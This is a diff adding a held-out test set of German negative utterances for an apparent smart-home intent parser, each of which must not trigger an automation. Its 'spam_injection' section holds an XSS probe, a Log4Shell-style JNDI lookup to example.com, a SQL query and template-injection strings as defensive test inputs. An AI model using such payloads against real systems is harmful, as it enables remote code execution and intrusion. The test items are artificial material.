@@ -1,0 +1,334 @@
+# HELD-OUT - adversarial negatives: must never create an automation or call a service.
+## how_to_capability
+reject :: Wie kann ich eine Benachrichtigung erstellen?
+reject :: Kann HomeIntent Benachrichtigungen schicken?
+reject :: Kannst du Benachrichtigungen schicken?
+reject :: Wie richte ich eine Automation mit Benachrichtigung ein?
+reject :: Kannst du mir erklären wie ich eine Meldung bekomme wenn der Rollo bei 50 Prozent ist?
+reject :: Wie funktioniert das mit den Push-Nachrichten?
+reject :: Was muss ich tun, damit ich benachrichtigt werde, wenn die Haustür aufgeht?
+reject :: Geht es, dass du mich benachrichtigst, wenn die Rolllade 50 Prozent erreicht?
+reject :: Ist es möglich, eine Nachricht zu bekommen, sobald das Fenster aufgeht?
+reject :: Wäre es theoretisch möglich, mich zu informieren, wenn die Temperatur steigt?
+reject :: Unterstützt HomeIntent Benachrichtigungen bei Rollladenpositionen?
+reject :: Welche Arten von Benachrichtigungen gibt es?
+reject :: Wie viele Automationen kann ich anlegen?
+reject :: Wie stelle ich ein, dass ich eine Nachricht bekomme, wenn es regnet?
+reject :: Wo stelle ich mein Handy für Push-Nachrichten ein?
+reject :: Wie ändere ich das Push-Ziel?
+reject :: Was bedeutet Benachrichtigung von HomeIntent?
+reject :: Kannst du auch auf mein iPhone schicken?
+reject :: Kann ich Benachrichtigungen für den Rollladen im Büro bekommen?
+reject :: Wie genau misst der Rollladen seine Position?
+reject :: Was passiert, wenn ich eine Automation für die Haustür anlege?
+reject :: Erklär mir mal, was eine Automation ist.
+reject :: Könntest du mir sagen, wie man Benachrichtigungen einrichtet?
+reject :: Wie heißt der Dienst für Push-Nachrichten?
+reject :: Wie oft darf eine Automation mich benachrichtigen?
+## why_complaints
+reject :: Warum habe ich keine Benachrichtigung bekommen?
+reject :: Warum wurde ich nicht benachrichtigt?
+reject :: Ich bekomme keine Benachrichtigung wenn die Rolllade 50 Prozent erreicht.
+reject :: Ich habe keine Nachricht bekommen, als die Haustür aufging.
+reject :: Warum kam keine Push-Nachricht, als das Fenster offen war?
+reject :: Die Benachrichtigung kam viel zu spät.
+reject :: Wieso bekomme ich immer zwei Nachrichten, wenn die Haustür aufgeht?
+reject :: Mich nervt die Nachricht, wenn der Rollladen hochfährt.
+reject :: Die Benachrichtigungen funktionieren nicht.
+reject :: Gestern kam keine Nachricht, obwohl das Bürofenster offen war.
+reject :: Warum sagt mir keiner Bescheid, wenn die Waschmaschine fertig ist?
+reject :: Hast du mir eine Nachricht geschickt, als die Haustür aufging?
+reject :: Wurde ich benachrichtigt, als der Rollladen bei 50 Prozent war?
+reject :: Wann hast du mir zuletzt eine Benachrichtigung geschickt?
+reject :: Warum hat die Automation für die Haustür nicht ausgelöst?
+reject :: Ich bekomme zu viele Benachrichtigungen.
+reject :: Warum ist mein Handy nicht als Push-Ziel eingetragen?
+reject :: Seit dem Update bekomme ich keine Nachrichten mehr.
+reject :: Ich wurde nicht informiert, als die Temperatur über 25 Grad stieg.
+reject :: Wieso habe ich nichts gehört, als das Küchenfenster aufging?
+## statements_descriptions
+reject :: Meine Rolllade steht bei 50 Prozent.
+reject :: Die Rolllade im Büro ist bei 50 Prozent.
+reject :: Der Rollladen im Büro hat 50 Prozent erreicht.
+reject :: Das Bürofenster ist offen.
+reject :: Die Haustür wurde gerade geöffnet.
+reject :: Im Wohnzimmer sind es 25 Grad.
+reject :: Der Handy Akku ist bei 20 Prozent.
+reject :: Es wird dunkel.
+reject :: Die Sonne geht unter.
+reject :: Julia ist nach Hause gekommen.
+reject :: Ich bin zuhause.
+reject :: Das Küchenlicht ist an.
+reject :: Die Rolllade im Wohnzimmer ist halb offen.
+reject :: Wenn die Rolllade 50 Prozent erreicht, ist sie halb offen.
+reject :: Wenn das Fenster offen ist, wird es kalt.
+reject :: Wenn es dunkel wird, gehen bei uns die Lichter an.
+reject :: Sobald die Sonne untergeht, wird es kühl.
+reject :: Normalerweise bekomme ich eine Nachricht, wenn die Haustür aufgeht.
+reject :: Früher hat mich HomeIntent benachrichtigt, wenn das Fenster aufging.
+reject :: Meine Frau sagt mir immer Bescheid, wenn die Haustür aufgeht.
+reject :: Das Handy piept, wenn eine Benachrichtigung kommt.
+reject :: Der Rollladen fährt jeden Abend auf 50 Prozent.
+reject :: Die Heizung geht aus, wenn das Fenster offen ist.
+reject :: Unser Rollo im Büro ist neu.
+reject :: Benachrichtigungen sind aktiviert.
+reject :: Der Rollladen im Büro klemmt manchmal bei 50 Prozent.
+reject :: Das war eine gute Benachrichtigung.
+reject :: Die Nachricht war hilfreich.
+reject :: Letzte Woche hat die Automation zuverlässig funktioniert.
+reject :: Ich habe eine Nachricht bekommen, dass das Fenster offen ist.
+## state_queries
+reject :: Welche Rolllade ist im Büro?
+reject :: Wie weit ist der Rollladen im Büro offen?
+reject :: Steht die Rolllade im Büro auf 50 Prozent?
+reject :: Ist der Rollladen im Büro bei 50 Prozent?
+reject :: Hat die Rolllade im Büro schon 50 Prozent erreicht?
+reject :: Wie ist die Position der Rolllade im Büro?
+reject :: Ist das Bürofenster offen?
+reject :: Ist ein Fenster im Wohnzimmer offen?
+reject :: Welche Fenster sind offen?
+reject :: Wie warm ist es im Wohnzimmer?
+reject :: Wie hoch ist die Luftfeuchtigkeit im Büro?
+reject :: Wie voll ist der Handy Akku?
+reject :: Ist jemand zuhause?
+reject :: Ist Julia zuhause?
+reject :: Wann geht heute die Sonne unter?
+reject :: Wie spät ist es?
+reject :: Ist die Haustür zu?
+reject :: Welche Rollläden sind halb offen?
+reject :: Läuft der Ventilator im Schlafzimmer?
+reject :: Ist das Wohnzimmerlicht auf 50 Prozent?
+reject :: Sag mir, ob das Bürofenster offen ist.
+reject :: Sag mir, wie weit der Rollladen im Büro offen ist.
+reject :: Sag mir ob der Rollladen im Büro bei 50 Prozent steht
+reject :: Wie viel Prozent hat der Rollladen im Büro?
+reject :: Wie weit ist der Rollo im Schlafzimmer unten?
+reject :: Welche Temperatur hat es draußen?
+reject :: Sind alle Fenster zu?
+reject :: Ist irgendein Fenster offen?
+reject :: Welcher Rollladen ist gerade in Bewegung?
+reject :: Weißt du, ob die Terrassentür offen ist?
+## automation_management_queries
+reject :: Zeig mir Automationen mit Benachrichtigungen.
+reject :: Welche Automationen gibt es?
+reject :: Welche Automationen schicken mir Nachrichten?
+reject :: Gibt es eine Automation für den Rollladen im Büro?
+reject :: Was macht die Automation für die Haustür?
+reject :: Welche Benachrichtigungen habe ich eingerichtet?
+reject :: Liste alle Automationen auf.
+reject :: Wie viele Benachrichtigungs-Automationen habe ich?
+reject :: Wann hat die Rollladen-Automation zuletzt ausgelöst?
+reject :: Zeig mir meine Push-Ziele.
+## negated_or_cancel
+reject :: Benachrichtige mich nicht, wenn die Haustür aufgeht.
+reject :: Schick mir keine Nachricht, wenn der Rollladen im Büro 50 Prozent erreicht.
+reject :: Ich will nicht benachrichtigt werden, wenn das Fenster aufgeht.
+reject :: Hör auf, mich zu benachrichtigen, wenn die Haustür aufgeht.
+reject :: Sag mir nicht Bescheid, wenn der Rollladen im Büro halb offen ist.
+reject :: Keine Nachrichten mehr, wenn die Terrassentür aufgeht.
+reject :: Ich brauche keine Nachricht, wenn das Küchenfenster geöffnet wird.
+reject :: Bitte keine Push-Nachricht, sobald die Temperatur über 25 Grad steigt.
+reject :: Benachrichtige mich nie wieder, wenn im Flur eine Bewegung erkannt wird.
+reject :: Mach das doch nicht.
+reject :: Doch nicht.
+reject :: Lass das mit der Benachrichtigung.
+reject :: Vergiss die Benachrichtigung für den Rollladen.
+reject :: Nein, keine Automation.
+reject :: Abbrechen.
+## hypothetical_reported_quoted
+reject :: Julia hat gesagt: Benachrichtige mich, wenn die Haustür aufgeht.
+reject :: Mein Kollege meinte, man könne sich benachrichtigen lassen, wenn die Rolllade 50 Prozent erreicht.
+reject :: Im Forum stand „Schick mir eine Nachricht, wenn das Fenster aufgeht“.
+reject :: Angenommen, ich würde sagen, benachrichtige mich wenn die Haustür aufgeht, was passiert dann?
+reject :: Was wäre, wenn du mich benachrichtigst, sobald das Fenster aufgeht?
+reject :: Ich überlege, ob ich eine Nachricht will, wenn die Rolllade im Büro 50 Prozent erreicht.
+reject :: Vielleicht wäre eine Nachricht gut, wenn die Haustür aufgeht, ich weiß noch nicht.
+reject :: Theoretisch könntest du mich benachrichtigen, wenn der Rollladen halb offen ist.
+reject :: Stell dir vor, die Haustür geht auf und du schickst mir eine Nachricht.
+reject :: In der Anleitung steht: Wenn das Fenster aufgeht, benachrichtige den Nutzer.
+reject :: Übersetze: Notify me when the door opens.
+reject :: Wie sagt man auf Englisch: Benachrichtige mich, wenn die Tür aufgeht?
+reject :: Schreib mir den Satz auf: Wenn die Rolllade 50 Prozent erreicht, sag mir Bescheid.
+reject :: Was hältst du davon, mich zu benachrichtigen, wenn es dunkel wird?
+reject :: Mein Sohn will immer eine Nachricht, wenn die Haustür aufgeht.
+## meta_and_chat
+reject :: Danke für die Nachricht.
+reject :: Hallo HomeIntent.
+reject :: Wer bist du?
+reject :: Was kannst du alles?
+reject :: Guten Morgen.
+reject :: Das ist ja interessant.
+reject :: Wie geht es dir?
+reject :: Hilfe.
+reject :: Okay.
+reject :: Ja.
+reject :: Nein.
+reject :: Die linke.
+reject :: Auf mein iPhone.
+reject :: 50 Prozent.
+reject :: Im Büro.
+reject :: Rolllade.
+reject :: Wenn.
+reject :: Benachrichtigung.
+reject :: Nachricht.
+reject :: Bescheid.
+## words_overlap_but_other_intent
+reject :: Lies mir die letzte Benachrichtigung vor.
+reject :: Lösche alle Benachrichtigungen.
+reject :: Was war die letzte Nachricht?
+reject :: Zeig mir die letzten Meldungen.
+reject :: Hast du eine Nachricht für mich?
+reject :: Gibt es neue Benachrichtigungen?
+reject :: Wer hat mir eine Nachricht geschickt?
+reject :: Wann hat Julia mir zuletzt geschrieben?
+reject :: Erzähl mir etwas über Rollläden.
+reject :: Was ist ein Rollladen?
+reject :: Was kostet ein neuer Rollladen?
+reject :: Wie heißt der Rollladen im Büro?
+reject :: Welche Geräte sind im Büro?
+reject :: Welche Lampen gibt es im Wohnzimmer?
+reject :: Was ist die Außentemperatur?
+reject :: Wie viel Uhr ist es in New York?
+reject :: Nenn mir alle Sensoren im Flur.
+reject :: Welche Rolllade hat 50 Prozent?
+reject :: Welcher Rollladen steht auf 50 Prozent?
+reject :: Wann war der Rollladen im Büro zuletzt bei 50 Prozent?
+## conditional_questions
+reject :: Was passiert, wenn der Rollladen im Büro 50 Prozent erreicht?
+reject :: Was machst du, wenn die Haustür aufgeht?
+reject :: Wird die Heizung ausgeschaltet, wenn das Fenster aufgeht?
+reject :: Geht das Licht an, wenn jemand die Haustür öffnet?
+reject :: Bekomme ich eine Nachricht, wenn die Haustür aufgeht?
+reject :: Werde ich benachrichtigt, wenn der Rollladen im Büro 50 Prozent erreicht?
+reject :: Sagst du mir Bescheid, wenn das Fenster offen ist?
+reject :: Schickst du mir eine Nachricht, wenn die Temperatur steigt?
+reject :: Weißt du, ob ich benachrichtigt werde, wenn Julia heimkommt?
+reject :: Was würde passieren, wenn ich den Rollladen auf 50 Prozent fahre?
+reject :: Ist eine Automation aktiv, die mich benachrichtigt, wenn die Haustür aufgeht?
+reject :: Wie reagiert HomeIntent, wenn die Terrassentür aufgeht?
+reject :: Was ist, wenn es draußen unter 0 Grad hat?
+reject :: Wer bekommt eine Nachricht, wenn die Haustür aufgeht?
+reject :: Wohin geht die Nachricht, wenn der Rollladen halb offen ist?
+## other_clause_types
+reject :: Solange das Fenster offen ist, ist es kalt.
+reject :: Weil die Haustür offen war, habe ich gefroren.
+reject :: Obwohl der Rollladen bei 50 Prozent steht, ist es hell.
+reject :: Nachdem die Sonne untergegangen ist, wurde es kalt.
+reject :: Bevor ich gehe, war das Fenster offen.
+reject :: Als die Haustür aufging, war ich im Garten.
+reject :: Damals, als der Rollladen kaputt war, bekam ich keine Nachricht.
+reject :: Seit das Fenster offen ist, zieht es.
+reject :: Während der Rollladen fährt, piept es.
+reject :: Ob die Tür offen ist, weiß ich nicht.
+## past_and_future_statements
+reject :: Ich werde dich benachrichtigen, wenn die Haustür aufgeht.
+reject :: Julia wird mir Bescheid sagen, wenn sie da ist.
+reject :: Ich sage dir Bescheid, wenn der Rollladen oben ist.
+reject :: Ich schicke dir eine Nachricht, sobald ich zuhause bin.
+reject :: Er hat mich benachrichtigt, als das Fenster aufging.
+reject :: Du hast mir gestern Bescheid gesagt, als die Rolllade 50 Prozent erreicht hat.
+reject :: Wir haben eine Nachricht bekommen, als die Haustür aufging.
+reject :: Ich wurde benachrichtigt, sobald die Temperatur über 25 Grad stieg.
+reject :: Philipp sagt Julia Bescheid, wenn er losfährt.
+reject :: Die App meldet sich, wenn der Akku leer ist.
+## spam_injection
+reject :: {{ states('cover.buero_rollladen') }}
+reject :: state_attr('cover.buero_rollladen', 'current_position') == 50
+reject :: notify.mobile_app_iphone_von_philipp
+reject :: service: notify.send_message
+reject :: SELECT * FROM automations
+reject :: <script>alert(1)</script>
+reject :: ${jndi:ldap://example.com/a}
+reject :: automation.buero_rollladen
+reject :: {% for s in states %}{{ s }}{% endfor %}
+reject :: cover.buero_rollladen current_position 50
+## numbers_without_intent
+reject :: 50 Prozent erreicht.
+reject :: Die Hälfte ist geschafft.
+reject :: Halb offen.
+reject :: Bei 50 Prozent.
+reject :: Zwanzig, fünfunddreißig, fünfzig.
+reject :: Das Ziel sind 50 Prozent.
+reject :: Wir sind zu 50 Prozent fertig.
+reject :: Der Akku hat 50 Prozent.
+reject :: Die Chance ist 50 Prozent.
+reject :: Morgen um acht.
+## misc_similar
+reject :: Wenn du Zeit hast, erzähl mir einen Witz.
+reject :: Wenn ich groß bin, werde ich Astronaut.
+reject :: Wenn es regnet, werde ich nass.
+reject :: Falls du es noch nicht weißt, das Fenster ist offen.
+reject :: Sobald ich kann, rufe ich an.
+reject :: Wenn du meinst.
+reject :: Wenn schon, denn schon.
+reject :: Falls nötig, sag Bescheid.
+reject :: Wie du meinst, wenn es sein muss.
+reject :: Wenn das so ist, ist ja gut.
+reject :: Wenn die Rolllade 50 Prozent erreicht? Keine Ahnung.
+reject :: Wenn die Haustür aufgeht, ist das normal.
+reject :: Sobald die Sonne untergeht, gehe ich spazieren.
+reject :: Wenn Julia nach Hause kommt, kochen wir.
+reject :: Immer wenn die Haustür aufgeht, bellt der Hund.
+reject :: Jedes Mal wenn der Rollladen fährt, quietscht er.
+reject :: Falls die Temperatur über 25 Grad steigt, gehen wir baden.
+reject :: Wenn ich nach Hause komme, bin ich müde.
+reject :: Wenn es dunkel wird, habe ich Angst.
+reject :: Sobald das Fenster offen ist, kommen Mücken rein.
+## direct_questions_with_modal_notify
+reject :: Könntest du Nachrichten verschicken?
+reject :: Darfst du mir Benachrichtigungen schicken?
+reject :: Wie benachrichtigst du mich?
+reject :: Womit benachrichtigst du mich?
+reject :: Über welches Gerät benachrichtigst du mich?
+reject :: Wen benachrichtigst du bei einer offenen Tür?
+reject :: Wann benachrichtigst du mich?
+reject :: Wie oft sagst du mir Bescheid?
+## english_and_foreign
+reject :: Notify me when the office blind reaches 50 percent.
+reject :: Send me a message when the front door opens.
+reject :: Préviens-moi quand la porte s'ouvre.
+reject :: Avvisami quando la finestra si apre.
+reject :: Tell me when it gets dark.
+## chit_chat_with_numbers
+reject :: Ich bin 50 Jahre alt.
+reject :: Mein Zimmer ist 25 Quadratmeter groß.
+reject :: Die Rolllade hat 50 Euro gekostet.
+reject :: Das Büro hat 3 Fenster.
+reject :: Im Büro stehen 2 Stühle.
+reject :: Die Temperatur war gestern 25 Grad.
+reject :: Letzten Sommer hatten wir 35 Grad.
+reject :: Das Fenster ist 1,20 Meter breit.
+reject :: Der Rollladen ist 10 Jahre alt.
+reject :: Die Haustür ist aus Holz.
+## requests_other_than_automation
+reject :: Wie ist das Wetter morgen?
+reject :: Spiel Musik im Wohnzimmer.
+reject :: Stell einen Timer auf 10 Minuten.
+reject :: Wie lange läuft der Timer noch?
+reject :: Wie viel Strom verbraucht die Kaffeemaschine?
+reject :: Wann kommt Julia nach Hause?
+reject :: Wer ist zuhause?
+reject :: Was steht heute im Kalender?
+reject :: Welche Lichter sind an?
+reject :: Wie ist der Status des Hauses?
+## trailing_negatives_extra
+reject :: Wenn im Büro die Rolllade 50 Prozent erreicht hat.
+reject :: Sobald die Haustür aufgeht.
+reject :: Falls es dunkel wird.
+reject :: Wenn der Rollladen im Büro bei 50 Prozent steht?
+reject :: Und wenn das Fenster aufgeht?
+reject :: Was, wenn die Rolllade 50 Prozent erreicht hat?
+reject :: Nur wenn es dunkel wird.
+reject :: Immer wenn die Haustür aufgeht?
+reject :: Jedes Mal, wenn das Fenster aufgeht.
+reject :: Sofern die Temperatur steigt.
+reject :: Benachrichtigung wenn Rollladen.
+reject :: Nachricht an mich.
+reject :: Push Nachricht Büro.
+reject :: Rollladen Büro 50.
+reject :: Büro Rolllade.
+reject :: Hmm, Benachrichtigung, Rollladen, keine Ahnung.
+reject :: Ich weiß nicht, ob ich eine Nachricht will.
+reject :: Später vielleicht eine Benachrichtigung.
+reject :: Eventuell eine Nachricht, wenn es passt.
+reject :: Keine Ahnung was ich will.
